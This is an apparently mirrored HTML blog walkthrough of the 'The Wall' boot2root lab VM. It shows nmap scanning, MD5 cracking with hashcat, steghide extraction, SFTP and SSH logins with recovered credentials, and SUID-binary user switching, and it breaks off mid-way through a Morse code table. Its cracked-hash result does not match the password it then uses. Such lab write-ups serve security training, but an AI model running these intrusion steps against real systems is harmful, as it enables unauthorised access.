@@ -1,0 +1,1154 @@
+<!DOCTYPE HTML>
+<html lang="en-US">
+
+<!-- Mirrored from highon.coffee/blog/the-wall-walkthrough/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 30 Nov 2017 18:04:50 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+<meta charset="UTF-8">
+<script src="https://highon.coffee/cdn-cgi/apps/head/oTwK22odZsY2CPSkVz5V2kmEjP0.js"></script><link rel="canonical" href="index.html">
+<title>The Wall Boot2Root Walkthrough</title>
+<meta name="description" content="The Wall Boot2Root - Walkthrough Guide">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<link rel="alternate" type="application/rss+xml" title="highon.coffee - penentration testing, hacking and coffee" href="https://highon.coffee/feed.xml">
+<link rel="stylesheet" href="http://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic,900">
+<link rel="stylesheet" type="text/css" href="https://highon.coffee/css/screen.css">
+<link href="http://maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet">
+<link rel="icon" type="image/x-icon" href="https://highon.coffee/favicon.ico">
+<!--[if lt IE 9]>
+  <script src="/js/html5shiv.min.js"></script>
+  <script src="/js/respond.min.js"></script>
+  <![endif]-->
+
+<script async defer src="https://buttons.github.io/buttons.js"></script>
+</head>
+<body class="wrap">
+<header>
+<nav class="mobile-nav show-on-mobiles">
+<ul>
+<li class="">
+<a href="https://highon.coffee/">Home</a>
+</li>
+<li class="current">
+<a href="../index.html">Blog</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/about/"><span class="hide-on-mobiles">About</span></a>
+</li>
+<li class="">
+<a href="https://highon.coffee/services/"><span class="hide-on-mobiles">Services</span></a>
+</li>
+</ul>
+</nav>
+<div class="grid">
+<div class="unit one-third center-on-mobiles">
+<h1>
+<a href="https://highon.coffee/">
+<span>HighOn.Coffee</span>
+<img src="https://highon.coffee/img/highoncoffee.png" width="300" height="115" alt="Logo">
+</a>
+</h1>
+</div>
+<nav class="main-nav unit two-thirds hide-on-mobiles">
+<ul>
+<li class="">
+<a href="https://highon.coffee/">Home</a>
+</li>
+<li class="current">
+<a href="../index.html">Blog</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/about/"><span class="hide-on-mobiles">About</span></a>
+</li>
+<li class="">
+<a href="https://highon.coffee/services/"><span class="hide-on-mobiles">Services</span></a>
+</li>
+</ul>
+</nav>
+</div>
+</header>
+<section class="blog">
+<div class="grid">
+<div class="docs-nav-mobile unit whole show-on-mobiles">
+<select onchange="if (this.value) window.location.href=this.value">
+<option value="">Navigate the blog…</option>
+<option value="/blog/">Home</option>
+<optgroup label="v1.x">
+<option value="/blog/penetration-testing-tools-cheat-sheet/">Penetration Testing Tools Cheat Sheet</option>
+<option value="/blog/lfi-cheat-sheet/">LFI Cheat Sheet</option>
+<option value="/blog/kali-chromium-install/">HowTo: Kali Linux Chromium Install for Web App Pen Testing</option>
+<option value="/blog/insomnihack-ctf-teaser-smartcat2-writeup/">InsomniHack CTF Teaser - Smartcat2 Writeup</option>
+<option value="/blog/insomnihack-ctf-teaser-smartcat1-writeup/">InsomniHack CTF Teaser - Smartcat1 Writeup</option>
+<option value="/blog/fristileaks-walkthrough/">FristiLeaks 1.3 Walkthrough</option>
+<option value="/blog/sickos-1-walkthrough/">SickOS 1.1 - Walkthrough</option>
+<option value="/blog/the-wall-walkthrough/">The Wall Boot2Root Walkthrough</option>
+<option value="/blog/sleepy-ctf-walkthrough/">/dev/random: Sleepy Walkthrough CTF</option>
+<option value="/blog/pipe-ctf-walkthrough/">/dev/random Pipe walkthrough</option>
+<option value="/blog/lord-of-the-root-walkthrough/">Lord of the Root Walkthrough CTF</option>
+<option value="/blog/vi-cheat-sheet/">Vi Cheat Sheet</option>
+<option value="/blog/jenkins-api-unauthenticated-rce-exploit/">Jenkins RCE via Unauthenticated API</option>
+<option value="/blog/skytower-walkthrough/">SkyTower - Walkthrough</option>
+<option value="/blog/zorz-walkthrough/">Zorz Walkthrough</option>
+<option value="/blog/systemd-cheat-sheet/">Systemd Cheat Sheet</option>
+<option value="/blog/freshly-walkthrough/">Freshly Walkthrough</option>
+<option value="/blog/macbook-post-install-check-list/">MacBook - Post Install Config + Apps</option>
+<option value="/blog/fartknocker-walkthrough/">FartKnocker - Walkthrough</option>
+<option value="/blog/reverse-shell-cheat-sheet/">Reverse Shell Cheat Sheet</option>
+<option value="/blog/nbtscan-cheat-sheet/">nbtscan Cheat Sheet</option>
+<option value="/blog/enum4linux-cheat-sheet/">enum4linux Cheat Sheet</option>
+<option value="/blog/linux-local-enumeration-script/">Linux Local Enumeration Script</option>
+<option value="/blog/security-harden-centos-7/">Security Harden CentOS 7</option>
+<option value="/blog/ssh-meterpreter-pivoting-techniques/">SSH & Meterpreter Pivoting Techniques</option>
+<option value="/blog/howto-install-quassel-ubuntu/">HowTo Install Quassel on Ubuntu</option>
+<option value="/blog/sokar-walkthrough/">Sokar - Walkthrough</option>
+<option value="/blog/tr0ll-2-walkthrough/">Tr0ll 2 Walkthrough</option>
+<option value="/blog/tr0ll-1-walkthrough/">Tr0ll 1 Walkthrough</option>
+<option value="/blog/nmap-cheat-sheet/">Nmap Cheat Sheet</option>
+<option value="/blog/linux-commands-cheat-sheet/">Linux Commands Cheat Sheet</option>
+<option value="/blog/shellshock-pen-testers-lab-walkthrough/">Pen Testers Lab: Shellshock CVE-2014-6271 - Walkthrough</option>
+<option value="/blog/keepnote-macbook-install-instructions/">HowTo Install KeepNote on OSX Mavericks</option>
+<option value="/blog/lamp-security-ctf8-walkthrough/">LAMP Security CTF8 - Walkthrough</option>
+<option value="/blog/kioptrix-level-2014-walkthrough/">Kioptrix Level 2014 Walkthrough</option>
+<option value="/blog/lamp-security-ctf7-walkthrough/">LAMP Security CTF7 - Walkthrough</option>
+<option value="/blog/lamp-security-ctf6-walkthrough/">LAMP Security CTF6 - Walkthrough</option>
+<option value="/blog/lamp-security-ctf5-walkthrough/">LAMP Security CTF5 - Walkthrough</option>
+<option value="/blog/lamp-security-ctf4-walkthrough/">LAMP Security CTF4 - Walkthrough</option>
+<option value="/blog/kioptrix-level-1-2-walkthrough/">Kioptrix Level 1.2 Walkthrough</option>
+<option value="/blog/kioptrix-level-1-1-walkthrough/">Kioptrix Level 1.1 Walkthrough</option>
+<option value="/blog/kioptrix-level-1-walkthrough/">Kioptrix Level 1 Walkthrough</option>
+</optgroup>
+</select>
+</div>
+<div class="unit four-fifths">
+<article>
+<h2>
+The Wall Boot2Root Walkthrough
+<a href="index.html" class="permalink" title="Permalink">∞</a>
+</h2>
+<span class="post-category">
+<span class="label">
+walkthroughs
+</span>
+</span>
+<div class="post-meta">
+<span class="post-date">
+02 Dec 2015
+</span>
+<a href="https://twitter.com/Arr0way" class="post-author">
+<img src="https://github.com/Arr0way.png" class="avatar" alt="Arr0way" width="24" height="24">
+Arr0way
+</a>
+</div>
+<div class="post-content">
+<div class="coffee-rating">
+<table>
+<tbody>
+<tr>
+<td>
+<p><code>Coffee Difficulty Rating:</code></p>
+</td>
+<td>
+<p><i class="fa fa-coffee"></i><i class="fa fa-coffee"></i><i class="fa fa-coffee"></i><i class="fa fa-coffee"></i></p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<ul id="markdown-toc">
+<li><a href="#author-description" id="markdown-toc-author-description">Author Description</a></li>
+<li><a href="#enumeration" id="markdown-toc-enumeration">Enumeration</a> <ul>
+<li><a href="#port-scanning" id="markdown-toc-port-scanning">Port Scanning</a></li>
+<li><a href="#service-enumeration" id="markdown-toc-service-enumeration">Service Enumeration</a></li>
+ <li><a href="#http-enumeration" id="markdown-toc-http-enumeration">HTTP Enumeration</a></li>
+</ul>
+</li>
+<li><a href="#hash-cracking" id="markdown-toc-hash-cracking">Hash Cracking</a> <ul>
+<li><a href="#md5-hashcat" id="markdown-toc-md5-hashcat">MD5 Hashcat</a></li>
+</ul>
+</li>
+<li><a href="#steghide" id="markdown-toc-steghide">Steghide</a></li>
+<li><a href="#sftp-login" id="markdown-toc-sftp-login">SFTP Login</a></li>
+<li><a href="#fatcat-fat16-forensics-tool" id="markdown-toc-fatcat-fat16-forensics-tool">Fatcat FAT16 Forensics Tool</a></li>
+<li><a href="#ssh-shell" id="markdown-toc-ssh-shell">SSH Shell</a></li>
+<li><a href="#local-system-enumeration" id="markdown-toc-local-system-enumeration">Local System Enumeration</a> <ul>
+<li><a href="#account-rogerwaters" id="markdown-toc-account-rogerwaters">Account: RogerWaters</a></li>
+<li><a href="#account-nickmason" id="markdown-toc-account-nickmason">Account: NickMason</a> <ul>
+<li><a href="#extracting-morse-code-data" id="markdown-toc-extracting-morse-code-data">Extracting Morse Code Data</a></li>
+<li><a href="#morse-code-decoded" id="markdown-toc-morse-code-decoded">Morse Code Decoded</a></li>
+</ul>
+</li>
+<li><a href="#discovered-credentials" id="markdown-toc-discovered-credentials">Discovered Credentials</a></li>
+<li><a href="#account-richardwright" id="markdown-toc-account-richardwright">Account: RichardWright</a></li>
+<li><a href="#path-manipulation" id="markdown-toc-path-manipulation">PATH Manipulation</a></li>
+<li><a href="#account-davidgilmour" id="markdown-toc-account-davidgilmour">Account: DavidGilmour</a></li>
+</ul>
+</li>
+<li><a href="#web-application-enumeration" id="markdown-toc-web-application-enumeration">Web Application Enumeration</a></li>
+<li><a href="#root-shell" id="markdown-toc-root-shell">Root Shell</a></li>
+<li><a href="#root-flag" id="markdown-toc-root-flag">Root Flag</a></li>
+</ul>
+<h2 id="author-description">Author Description</h2>
+<p>In 1965, one of the most influential bands of our times was formed.. Pink
+Floyd. This boot2root box has been created to celebrate 50 years of Pink
+Floyd’s contribution to the music industry, with each challenge giving the
+attacker an introduction to each member of the Floyd.</p>
+<p><strong>Author:</strong> <a href="https://twitter.com/xerubus">@xerubus</a></p>
+<p><strong>Download:</strong> <a href="https://www.vulnhub.com/">VulnHub</a></p>
+<h2 id="enumeration">Enumeration</h2>
+<p>An initial Nmap scan yielded no results.</p>
+<p>WireShark was used to expose an ARP broadcast for <code>TCP: 1337</code>, a netcat listener was setup on port 1337.</p>
+<p>The target machine connected with the following message:</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">netcat -n -v -l -p
+
+                      .u!<span class="s2">"</span><span class="sb">`</span>
+                  .x<span class="k">*</span><span class="s2">"</span><span class="sb">`</span>
+              ..+<span class="s2">"NP
+           .z""   ?
+         M#</span><span class="sb">`</span>      9     ,     ,
+                  9 M  d! ,8P<span class="s1">'
+                  R X.:x'</span> R<span class="s1">'  ,
+                  F F'</span> M  R.d<span class="s1">'
+                  d P  @  E`  ,
+     ss           P  '</span>  P  N.d<span class="s1">'
+      x         ''        '</span>
+      X               x             .
+      9     .f       !         .    <span class="nv">$b</span>
+      4;    <span class="nv">$k</span>      /         dH    <span class="nv">$f</span>
+     <span class="s1">'X   ;$$     z  .       MR   :$
+       R   M$$,   :  d9b      M'</span>   tM
+       M:  <span class="c">#'$L  ;' M `8      X    MR</span>
+       <span class="sb">`</span><span class="nv">$;</span><span class="s2">t' </span><span class="nv">$F</span><span class="s2">  # X ,oR      t    Q;
+        </span><span class="nv">$$</span><span class="s2">@  R</span><span class="nv">$ </span><span class="s2">H :RP' </span><span class="nv">$b</span><span class="s2">     X    @'
+        9</span><span class="nv">$E</span><span class="s2">  @Bd' </span><span class="nv">$'</span><span class="s2">   ?X     ;    W
+        </span><span class="sb">`</span>M<span class="s1">'  `$M d$    `E    ;.o* :R   ..
+         `    '</span>  <span class="s2">"'     '    @'   '</span><span class="nv">$o</span><span class="s2">*"</span><span class="s1">'
+
+             The Wall by @xerubus
+         -= Welcome to the Machine =-
+
+If you should go skating on the thin ice of modern life, dragging behind you the silent reproach of a million tear-stained eyes, don'</span>t be surprised when a crack <span class="k">in </span>the ice appears under your feet. - Pink Floyd, The Thin Ice</code></pre></figure>
+<h3 id="port-scanning">Port Scanning</h3>
+<p>After the machine successfully connected to the netcat listener the following
+services were discovered with Nmap.</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># nmap -sV -p 1-65535 -A -v 192.168.221.129</span>
+
+Starting Nmap 7.00 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2015-11-30 06:29 EST
+NSE: Loaded 132 scripts <span class="k">for </span>scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 06:29
+Completed NSE at 06:29, 0.00s elapsed
+Initiating NSE at 06:29
+Completed NSE at 06:29, 0.00s elapsed
+Initiating ARP Ping Scan at 06:29
+Scanning 192.168.221.129 <span class="o">[</span>1 port]
+Completed ARP Ping Scan at 06:29, 0.07s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
+Initiating Parallel DNS resolution of 1 host. at 06:29
+Completed Parallel DNS resolution of 1 host. at 06:29, 0.00s elapsed
+Initiating SYN Stealth Scan at 06:29
+Scanning 192.168.221.129 <span class="o">[</span>65535 ports]
+Discovered open port 80/tcp on 192.168.221.129
+SYN Stealth Scan Timing: About 20.45% <span class="k">done</span>; ETC: 06:31 <span class="o">(</span>0:02:01 remaining<span class="o">)</span>
+SYN Stealth Scan Timing: About 48.81% <span class="k">done</span>; ETC: 06:31 <span class="o">(</span>0:01:04 remaining<span class="o">)</span>
+Discovered open port 1965/tcp on 192.168.221.129
+Completed SYN Stealth Scan at 06:30, 104.59s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Initiating Service scan at 06:30
+Scanning 2 services on 192.168.221.129
+Completed Service scan at 06:32, 96.15s elapsed <span class="o">(</span>2 services on 1 host<span class="o">)</span>
+Initiating OS detection <span class="o">(</span>try <span class="c">#1) against 192.168.221.129</span>
+NSE: Script scanning 192.168.221.129.
+Initiating NSE at 06:32
+Completed NSE at 06:32, 7.22s elapsed
+Initiating NSE at 06:32
+Completed NSE at 06:32, 0.00s elapsed
+Nmap scan report <span class="k">for </span>192.168.221.129
+Host is up, received arp-response <span class="o">(</span>0.00027s latency<span class="o">)</span>.
+Not shown: 65533 filtered ports
+Reason: 65533 no-responses
+PORT     STATE SERVICE REASON         VERSION
+80/tcp   open  http    syn-ack ttl 64 OpenBSD httpd
+| http-methods:
+|_  Supported Methods: GET HEAD
+|_http-server-header: OpenBSD httpd
+|_http-title: Site doesn<span class="s1">'t have a title (text/html).
+1965/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.0 (protocol 2.0)
+| ssh-hostkey:
+|   2048 70:26:15:de:7b:29:9a:56:a3:eb:33:e0:7e:fb:92:d8 (RSA)
+|_  256 6c:2b:d1:2c:4f:1c:b5:7a:1b:1e:e9:4b:8e:9b:4b:5a (ECDSA)
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port80-TCP:V=7.00%I=7%D=11/30%Time=565C336F%P=x86_64-pc-linux-gnu%r(Get
+SF:Request,2D9,"HTTP/1\.0\x20200\x20OK\r\nConnection:\x20close\r\nContent-
+SF:Length:\x20539\r\nContent-Type:\x20text/html\r\nDate:\x20Sun,\x2029\x20
+SF:Nov\x202015\x2022:51:15\x20GMT\r\nLast-Modified:\x20Sat,\x2024\x20Oct\x
+SF:202015\x2015:20:23\x20GMT\r\nServer:\x20OpenBSD\x20httpd\r\n\r\n&lt;html&gt;\
+SF:n&lt;body\x20bgcolor=\"#000000\"&gt;\n&lt;center&gt;&lt;img\x20src=\"pink_floyd\.jpg\"
+SF:&lt;/img&gt;&lt;/center&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n\n\n&lt;!--If\x20you\x20want\x20to\x20f
+SF:ind\x20out\x20what'</span>s<span class="se">\x</span>20behind<span class="se">\x</span>20these<span class="se">\x</span>20cold<span class="se">\x</span>20eyes,<span class="se">\x</span>20you<span class="s1">'ll\x20j
+SF:ust\x20have\x20to\x20claw\x20your\x20way\x20through\x20this\x20disguise
+SF:\.\x20-\x20Pink\x20Floyd,\x20The\x20Wall\n\nDid\x20you\x20know\?\x20The
+SF:\x20Publius\x20Enigma\x20is\x20a\x20mystery\x20surrounding\x20the\x20Di
+SF:vision\x20Bell\x20album\.\x20\x20Publius\x20promised\x20an\x20unspecifi
+SF:ed\x20reward\x20for\x20solving\x20the\x20\nriddle,\x20and\x20further\x2
+SF:0claimed\x20that\x20there\x20was\x20an\x20enigma\x20hidden\x20within\x2
+SF:0the\x20artwork\.\n\n737465673d3333313135373330646262623337306663626539
+SF:373230666536333265633035--&gt;\n\n")%r(HTTPOptions,218,"HTTP/1\.0\x20405\x
+SF:20Method\x20Not\x20Allowed\r\nDate:\x20Sun,\x2029\x20Nov\x202015\x2022:
+SF:51:15\x20GMT\r\nServer:\x20OpenBSD\x20httpd\r\nConnection:\x20close\r\n
+SF:Content-Type:\x20text/html\r\nContent-Length:\x20376\r\n\r\n&lt;!DOCTYPE\x
+SF:20html&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;title&gt;405\x20Method\x20Not\x20Allowed&lt;/title&gt;
+SF:\n&lt;style\x20type=\"text/css\"&gt;&lt;!--\nbody\x20{\x20background-color:\x20w
+SF:hite;\x20color:\x20black;\x20font-family:\x20'</span>Comic<span class="se">\x</span>20Sans<span class="se">\x</span>20MS<span class="s1">',\x20
+SF:'</span>Chalkboard<span class="se">\x</span>20SE<span class="s1">',\x20'</span>Comic<span class="se">\x</span>20Neue<span class="s1">',\x20sans-serif;\x20}\nhr\x20{\x2
+SF:0border:\x200;\x20border-bottom:\x201px\x20dashed;\x20}\n\n--&gt;&lt;/style&gt;\
+SF:n&lt;/head&gt;\n&lt;body&gt;\n&lt;h1&gt;405\x20Method\x20Not\x20Allowed&lt;/h1&gt;\n&lt;hr&gt;\n&lt;addr
+SF:ess&gt;OpenBSD\x20httpd&lt;/address&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n")%r(RTSPRequest,218,
+SF:"HTTP/1\.0\x20405\x20Method\x20Not\x20Allowed\r\nDate:\x20Sun,\x2029\x2
+SF:0Nov\x202015\x2022:51:15\x20GMT\r\nServer:\x20OpenBSD\x20httpd\r\nConne
+SF:ction:\x20close\r\nContent-Type:\x20text/html\r\nContent-Length:\x20376
+SF:\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;title&gt;405\x20Method\x20Not
+SF:\x20Allowed&lt;/title&gt;\n&lt;style\x20type=\"text/css\"&gt;&lt;!--\nbody\x20{\x20bac
+SF:kground-color:\x20white;\x20color:\x20black;\x20font-family:\x20'</span>Comic<span class="se">\</span>
+SF:x20Sans<span class="se">\x</span>20MS<span class="s1">',\x20'</span>Chalkboard<span class="se">\x</span>20SE<span class="s1">',\x20'</span>Comic<span class="se">\x</span>20Neue<span class="s1">',\x20sans-seri
+SF:f;\x20}\nhr\x20{\x20border:\x200;\x20border-bottom:\x201px\x20dashed;\x
+SF:20}\n\n--&gt;&lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;h1&gt;405\x20Method\x20Not\x20Allowe
+SF:d&lt;/h1&gt;\n&lt;hr&gt;\n&lt;address&gt;OpenBSD\x20httpd&lt;/address&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n");
+MAC Address: 00:0C:29:31:3C:84 (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: OpenBSD 5.X
+OS CPE: cpe:/o:openbsd:openbsd:5
+OS details: OpenBSD 5.0 - 5.4
+Uptime guess: 0.000 days (since Mon Nov 30 06:32:25 2015)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=258 (Good luck!)
+IP ID Sequence Generation: Randomized
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.27 ms 192.168.221.129
+
+NSE: Script Post-scanning.
+Initiating NSE at 06:32
+Completed NSE at 06:32, 0.00s elapsed
+Initiating NSE at 06:32
+Completed NSE at 06:32, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 210.78 seconds
+           Raw packets sent: 131193 (5.775MB) | Rcvd: 91 (4.108KB)</span></code></pre></figure>
+<h3 id="service-enumeration">Service Enumeration</h3>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>Version Detection</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<pc><p><code>TCP: 80</code></p></pc>
+</td>
+<td>
+<pc><p>HTTP</p></pc>
+</td>
+<td>
+<pc><p>OpenBSD httpd</p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>TCP: 1965</code></p></pc>
+</td>
+<td>
+<pc><p>SSH</p></pc>
+</td>
+<td>
+<pc><p>OpenSSH 7.0 (protocol 2.0)</p></pc>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="http-enumeration">HTTP Enumeration</h3>
+<p>Interrogation of the page source revealed a code comment with an <strong>ASCII</strong> encoded string:</p>
+<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="c">&lt;!--If you want to find out what's behind these cold eyes, you'll just have to claw your way through this disguise. - Pink Floyd, The Wall
+
+Did you know? The Publius Enigma is a mystery surrounding the Division Bell album.  Publius promised an unspecified reward for solving the
+riddle, and further claimed that there was an enigma hidden within the artwork.
+
+737465673d3333313135373330646262623337306663626539373230666536333265633035--&gt;</span></code></pre></figure>
+<p>Decoding revealed the MD5 hash:<code>steg=33115730dbbb370fcbe9720fe632ec05</code></p>
+<h2 id="hash-cracking">Hash Cracking</h2>
+<h3 id="md5-hashcat">MD5 Hashcat</h3>
+<p>The discovered hash was cracked with <strong>Hashcat</strong>:</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">hashcat -m 0 -a 0 thewall.txt /usr/share/wordlists/rockyou.txt</code></pre></figure>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Hash</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<pc><p><code>33115730dbbb370fcbe9720fe632ec05</code></p></pc>
+</td>
+<td>
+<pc><p>pinkfloydrocks</p></pc>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="steghide">Steghide</h2>
+<p>Install steghide on kali: <code>apt-get install -y steghide</code></p>
+<p>The steghide command <code>steghide extract -sf pink_floyd.jpg</code> was used to extract data from images with hidden
+information retained within them (steganography). Entering the previously
+cracked password <code>divisionbell</code> disclosed another message containing
+a <strong>base64</strong> encoded string and another <strong>md5</strong> hash.</p>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<pc><p><code>SydBarrett</code></p></pc>
+</td>
+<td>
+<pc><p>divisionbell</p></pc>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="sftp-login">SFTP Login</h2>
+<p>The discovered account credentials above allowed access to an SFTP server on
+the target machine.</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">sftp&gt; </span><span class="nb">cd</span> .mail/.stash/
+<span class="gp">sftp&gt; </span>ls
+eclipsed_by_the_moon
+<span class="gp">sftp&gt; </span>get eclipsed_by_the_moon</code></pre></figure>
+<p>The file <code>eclipsed_by_the_moon</code> was downloaded for further
+investigation.</p>
+<h2 id="fatcat-fat16-forensics-tool">Fatcat FAT16 Forensics Tool</h2>
+<p>The <code>file</code> command was leveraged to disclose the following information about the
+previously retrived file <code>ecslipsed_by_the_moon</code>.</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">eclipsed_by_the_moon.lsd: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID
+<span class="s2">"MSDOS5.0"</span>, sectors/cluster 2, reserved sectors 8, root entries 512, Media
+descriptor 0xf8, sectors/FAT 188, sectors/track 63, heads 255, hidden sectors
+2048, sectors 96256 <span class="o">(</span>volumes &gt; 32 MB<span class="o">)</span> , serial number 0x9e322180, unlabeled,
+FAT <span class="o">(</span>16 bit<span class="o">)</span></code></pre></figure>
+<p>Research discovered <strong>Fatcat</strong> a forensics tool used for
+recovering / extracting data from FAT16 images.</p>
+<p>The following command was used to extract a deleted image file from the FAT16
+disk image:</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">fatcat ~/Desktop/eclipsed_by_the_moon.lsd -r /rogerwaters.jpg &gt; rogerwaters.jpg</code></pre></figure>
+<p>Viewing the image disclosed the users password:</p>
+<p><img src="https://highon.coffee/img/blog/thewall/rogerwaters.jpg" alt="Roger Waters - Pink Floyd - The Wall" /></p>
+<h2 id="ssh-shell">SSH Shell</h2>
+<p>A non privileged SSH shell was established using the previously discovered
+credentials.</p>
+<div class="note info">
+<h5>Username format</h5>
+<p>The uppercase characters in the username were guessed from the previous username pattern. </p>
+</div>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<pc><p><code>RogerWaters</code></p></pc>
+</td>
+<td>
+<pc><p>hello_is_there_anybody_in_there</p></pc>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="local-system-enumeration">Local System Enumeration</h2>
+<h3 id="account-rogerwaters">Account: RogerWaters</h3>
+<p>Enumeration of the system discovered the SUID binary: <code>/usr/local/bin/brick</code></p>
+<p>Running the suid binary and answering the question correctly with <code>Nick Mason</code> change the current user to “NickMason”.</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">$ </span>/usr/local/bin/brick
+
+What have we here, laddie?
+Mysterious scribbings?
+A secret code?
+Oh, poems, no less!
+Poems everybody!
+
+Who is the only band member to be featured on every Pink Floyd album? : Nick
+Mason
+/bin/sh: Cannot determine current working directory
+<span class="gp">$ </span>id
+<span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>NickMason<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>NickMason<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>RogerWaters<span class="o">)</span></code></pre></figure>
+<h3 id="account-nickmason">Account: NickMason</h3>
+<p>Local enumeration of <code>nick_mason_profile_pic.jpg</code> discovered the file was an .ogg audio file containing morsecode data.</p>
+<h4 id="extracting-morse-code-data">Extracting Morse Code Data</h4>
+<p>The ogg file contained morse code data with music playing at the same time over
+both stereo channels.</p>
+<p><strong>Audacity</strong> was used with a low high pass filter to help remove as much of the
+lower frequency music as possible, making the higher frequency morse code tones
+easier to hear.</p>
+<p><img src="https://highon.coffee/img/blog/thewall/audacity.png" alt="Audacity Morse Code Low Pass Filter" /></p>
+<p><strong>Sonic Visualiser</strong> was used in addition to help visualise the morse code dots and
+dashes.</p>
+<p><img src="https://highon.coffee/img/blog/thewall/morse-code.png" alt="Sonic Visualiser Morse Code" /></p>
+<h4 id="morse-code-decoded">Morse Code Decoded</h4>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Morse Code</th>
+<th>Character</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<pc><p><code>.-.</code></p></pc>
+</td>
+<td>
+<pc><p><b>R</b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>..</code></p></pc>
+</td>
+<td>
+<pc><p><b>I</b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>-.-.</code></p></pc>
+</td>
+<td>
+<pc><p><b>C</b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>....</code></p></pc>
+</td>
+<td>
+<pc><p><b>H</b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>.-</code></p></pc>
+</td>
+<td>
+<pc><p><b>A</b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>.-.</code></p></pc>
+</td>
+<td>
+<pc><p><b>R</b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>-..</code></p></pc>
+</td>
+<td>
+<pc><p><b>D</b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>.--</code></p></pc>
+</td>
+<td>
+<pc><p><b>W</b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>.-.</code></p></pc>
+</td>
+<td>
+<pc><p><b>R</b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>..</code></p></pc>
+</td>
+<td>
+<pc><p><b>I</b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>--.</code></p></pc>
+</td>
+<td>
+<pc><p><b>G</b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>....</code></p></pc>
+</td>
+<td>
+<pc><p><b>H</b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>-</code></p></pc>
+</td>
+<td>
+<pc><p><b>T</b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>.---- </code></p></pc>
+</td>
+<td>
+<pc><p><b>1</b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>----.</code></p></pc>
+</td>
+<td>
+<pc><p><b>9</b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>....-</code></p></pc>
+</td>
+<td>
+<pc><p><b>4</b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>...--</code></p></pc>
+</td>
+<td>
+<pc><p><b>3</b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>..-.</code></p></pc>
+</td>
+<td>
